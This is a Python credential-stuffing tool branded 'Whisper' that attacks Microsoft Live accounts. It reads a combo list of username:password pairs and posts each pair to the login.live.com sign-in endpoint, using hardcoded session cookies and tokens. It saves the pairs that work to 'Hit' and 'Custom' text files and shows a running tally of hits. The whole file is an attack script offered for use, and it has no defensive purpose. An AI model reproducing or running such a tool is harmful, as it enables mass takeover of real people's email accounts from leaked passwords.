import requests,os
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
ok=0
fa=0
wp=0
tk=0
logo=(f'''{G} _    _ _     _                     
{G}| |  | | |   (_)                    
{G}| |  | | |__  _ ___ _ __   ___ _ __ 
{G}| |/\| | '_ \| / __| '_ \ / _ \ '__|
{G}\  /\  / | | | \__ \ |_) |  __/ |   
{G} \/  \/|_| |_|_|___/ .__/ \___|_|   
{G}                   | |              
{G}                   |_|              
{G}[G] GitHub    : {B}@VIPWhisper
{G}[I] InstaGram : {B}@Whisper_DEV
{G}[F] FaceBook  : {B}@WHISPER.DZA
{G}[T] TeleGram  : {B}@WHI3PER''')
def msg(username,password):
 global ok,fa,wp,tk
 os.system('clear')
 print(logo)
 print(f'{B}ـ'*40)
 print(f'''{G}[√] Hit : {B}{ok}
{B}[=] Custom : {S}{fa}
{S}[×] Wrong : {E}{wp}''')
 print(f'{B}ـ'*40)
 print(f'{S}[+] {B}{username} {S}| {B}{password}')
 print(f'{B}ـ'*40)
def whisper(username,password):
 global ok,fa,wp,tk
 try:
  res = requests.post("https://login.live.com/ppsecure/post.srf?username=ahmdgomez%40outlook.com&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=9A90C5547A2EB1CE&opid=CB32881D08E327F8&bk=1703201405&uaid=d25f7b9ea72f446c9a7b288b16762fa2&pid=15216", headers={"Host": "login.live.com"},cookies={'__Host-MSAAUTH': '11-M.C105_BL2.CmiDjjq6yrRvhBQhtnNk!Pj34H7jzdIjTNSyJwPlFUnlyX7Rf8tfzOsgljIY!EEVQa!Sr7w7MBXfHQf5yntM1r1sxQjUhZBiHCfgJ4G2zT611MslvkXzwRejj4w9u7ypiHs80EuEuc3aktYGPygWCQpyDny4YeihBhNXZ!V2eW7*BFQIQTZwKY04JgxHcaWEffEgtRqkrB0LE1gf!v7ngcRbJsDhXA9zy*6LPqocqwBoNBhEfXsjC6jlpE6aqfHXpjmqGsbfGnfOr3WF8alvT7o$','MSPOK': '$uuid-723304aa-a45b-4199-a7bd-c6cde97e9c3d$uuid-c36d06db-8f0e-4647-a676-98cfd87d0ac1$uuid-c9a322f2-e691-4027-ab1f-09b38ff3d225$uuid-a9c442fc-fcc9-4a3e-b6c0-59bb426f330f', 'OParams': '11O.DhCRcnfBwpHEBvpbf8uBo4lBP20Z56PEWPycl*Ay0hSrO!ov11qcOG1CEx7K6nsfZjcT2yPSrpfHSOdIasNHzkbrkXPSfeCDyks6fLymX63AoU6TpKUrVNVLMpBEuUIfRLB9Km7Ef!QDbFhIffLuVm2Z3zLcObMAygO73opY5srghi18W45bKr3!HNiRNW1ieQxCgbA2jC7Y4IBQfRHWgnE3N9pazFL1ztJOF0YAc*umfoWFRTyzHnwfgQXfFux8dlXf5Aq1mLf2BzJfG92JNhlfbOp4ADDYf6fIgYmZw!zz7WEhTSyX!U5pHGaR1DnLpUPH6A357!c9lREXWNbHzAHJAnIlnwD4peXhHOxZMzqQhSQARxcIUDKxRoWN8e4xmb6y7XM18VVZWrxeEgutKjv6j9PyI3srixeh4zCwFDUvGQuNDF91a4KukMlRZ*7LfkASPwtUrSnkdHdLD*xQ7KZpbo2OYfz8*IbgOQlbsEqkkZ*ZTQU9OeEcyd9IXE4IvRRYkCinsUmN9h5Hi34G1z63jOOQ1ige3Y9g8rpUNn8mBu7IstnhQgybqU5*s*v*6hOYK6q4M4NYUpaKqCysORrm5xFCkYtZz*JXvwO1x9efrj27F!sBFn2BcC0ZPWf4sN2uMnoK0*CibikxRliim0gTUTh4nuwNWCjZbSyDwM7SFr*HYtEoEUNRXXWW3D4z00oDBSyDxTNJfIKOMYIZxFaToEA0mLeVPR03c8JKofWZRCJi9UYQ63T2hFcbPuC*mCAn4p46dDspl0HyOH1W7t8EuOxQ6YSy5ASsP05n1XhbVlgB*WHG!tGYx*u0V5uowZCvFoxH5IvTNnYjfH*QEhjT9u*yehSnayn4fZYVTIJt*4edC7U7NoBIU7Rtz6d!gdso!YSonJSEL6z79QtPhsj0OvGDgfADgbfjQji3P8t1oeVMGSOltJIoaA7lno9lZ6c2zPXxzw64oMcsMGT8lg7y4bi0LfTK2vJ6WHuapJyHEafR7cWP0313UCg3bBKnB5Ror8RhdXgUrexcz3BExloCRso6bcBtW98RQTKb*5Gh3H9yBMNksHaSob*7VNWJQ3Gl!tz3MczPlOgK*DycU3RQaWoz7ZXPLiaVXJ8XMr2nnmovb8cUYobeE4dGf7esqgo4*j8Ng4WnQlLbbv2kxUliAkG*6FQcz4*OOFLyPWCyquDe55yyYJhZQAqrBN*xLfQ4gJohzWSz3jIC6E*oQUEoCuE10W6!qr072Q7EJ3D*AZ23xYyF!D1nRe9oI*tLcLoa7UXeOEyjxOwSXmYFCQjGBghb0Y2ST0eSfvn7!zFFusb!PK2j*HuY!ayCF9MxXtgnLGoxGru8oq0LVd8gJovWUXn6KDSATh5s90qXxQ43nIXr28YW7tpSCNyTnBmjma6XyUFBmyGKPU3foCwdB3KPVOpeGP6ZWED5eJQf0Xs4Ad5Mac8XIczjhbkfHTC*D5UyiNiR51GEEHXcVxgz2B9sl6N2K*bKfXyoQdlekAPfx6QqSNl0fZCZyx*YGmbKiK8VM2vpIWI8szZa!FXZ!w3xUGb83KORrc4vFzVUwQU3!SpVWpquqLE*jAHTbD9Bt9VtH9d3LkKjda2wh5H1HXJHtXUk8TKd5AGJA9cMLGryVOn53908MExnVo6qPyrr435Cvol1a2vKCBt!yseKbT7zq8VfE5!tXGLdJw0fNmd6*AA2WD9F1OhLP0nzBbxm1uiqa25*4DvAyX1JabBubFXlmPtDMUr*ibQOJlUv26veqYH2BTn!6YYhvT63osoI3jfZodk4!SmvOEBMIOygSwv2!zgh5eV!TTOSh0VNf84MJbEyLnsH43cv!mK7C8kdWL9nfajsngeTZXXtDQqjwwZ0ETE9RE3IcJNlkVl1bEsUBL!GUSKf!GZiyn8yG9UUc4Z*Po7!7qwQgedFCyye63V8AiHUOOFI5T92Yjlz6eeWH8jUgpJLiImgktqvBl00nACqjM2iAK2GwW1crQRa5oPpqNsu2lvI6MbBekp!cISXLCvGLLX0GN9AhvTnAoVPUtjDv8vUXrcfCcmPxwgzFT9L4yBB1fk07PkbrnFM8BM1XBOE1xYQCHL8aubIzWwVQevvUF1FuoqZHyseHNjOAYyh39DQAAZjWjraSEt0mu7V52JfqZq9ECJEBOvaztAQVe21yId88RbKiQZ1GnNY36h5IbCRgLlTTcGKsY5QoTSoJVbXz8w!qHYdt6cfRe5XX!KUwYg*44sIzV*oQdnAX6HEjWp!AXsv!kvYQ3vHZw3lkiHODCERUU3SRv5AHvjvA6ezRsVFo0zUtCbM!5kkNyMsjg8FNNyZ4dg9koOOAggG3vtt1uooFLSBtIDecw58IOZqHrRK*aCV!P7s3d8Ry8*FY1mcZnrGIstbfwB6w1UbVCfMGLVFTr8cT13BXre1Bxrw78CrcDGYTXu08Foy!fYuMhxB2xq3VkO7YFbEjEREnautBCOdQ!Jdvsm7AqPoUv14f*p6nVoD4Z8ON4OnrgfOoSNJ*XAV!SLKZLCyVgXx7!C7afuoBji7eTvG0aNfgOZhDGxnnV494G82v9U9NGFMtcz7kFyph5pmXkNmgya1M!RndgkPw5X99DFairGTBw$$'}, data={"i13": "0","login": username,"loginfmt": username,"type": "11","LoginOptions": "3","lrt": "","lrtPartition": "","hisRegion": "","hisScaleUnit": "","passwd": password,"ps": "2","psRNGCDefaultType": "","psRNGCEntropy": "","psRNGCSLK": "","canary": "","ctx": "","hpgrequestid": "","PPFT": "-Dv8FAHsFzuAILL1XjigwmaOsmdC7SfyLDCunP6Ir9n2E5LCF7JVJqskLdRq6QP0S5pNm6rAC2Glo9JhCdm8pYybQsz5ICjXLv8Op*WXXVUJQ0SyGZHXdJ0mElh4GKUg3*iWXbxKTae7ghhON55iGB8LvNAdCfuefEiCc4xZEtt5wGBoPI7M607wZcP37zEp*PA$$","PPSX": "PassportR","NewUser": "1","FoundMSAs": "","fspost": "1","i21": "0","CookieDisclosure": "0","IsFidoSupported": "0","isSignupPost": "0","isRecoveryAttemptPost": "0","i19": "8840"})
  response=res.text
  if "You don't have permission to access" in response:
   ok+=1
   msg(username,password)
   with open('Hit-Live.txt','a+') as whisper:
     whisper.write(f'{username}:{password}\n')
  elif 'pprid' in response:
   fa+=1
   msg(username,password)
   with open('Custom-Live.txt','a+') as whisper:
     whisper.write(f'{username}:{password}\n')
  else:
   wp+=1
   msg(username,password)
 except:
  pass
os.system('cls');os.system('clear')
print(logo)
print(f'{E}ـ'*40)
path=input(f'{B}[+] Combo List Path : {G}')
print(f'{E}ـ'*40)
for whis in open(path,'r').read().splitlines():
  acc=str(whis)
  acc=acc.split('\n')[0]
  username , password = acc.split(':')
  whisper(username,password.split(' ')[0])